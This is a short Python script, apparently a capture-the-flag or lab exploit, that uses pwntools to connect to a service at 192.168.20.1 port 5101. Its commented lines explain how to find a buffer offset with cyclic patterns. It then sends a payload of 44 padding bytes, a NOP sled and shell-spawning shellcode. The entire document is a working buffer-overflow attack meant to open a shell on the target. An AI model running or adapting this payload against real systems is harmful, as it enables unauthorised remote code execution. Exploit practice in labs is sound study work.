from pwn import *

if __name__ == "__main__":

    bin = remote('192.168.20.1', 5101)
    
    # HOW TO FIND FIND THE OFFSET 
    # pattern = cyclic(100) 
    # io = process(bin)
    # io.sendline(pattern)
    # offset = cyclic_find(0x6161616c)
    # print(offset)
    
    offset = 44
    shellcode = asm(shellcraft.sh())
    payload = b'A' * offset + asm("nop") * 100 + shellcode
    bin.sendline(payload)
    
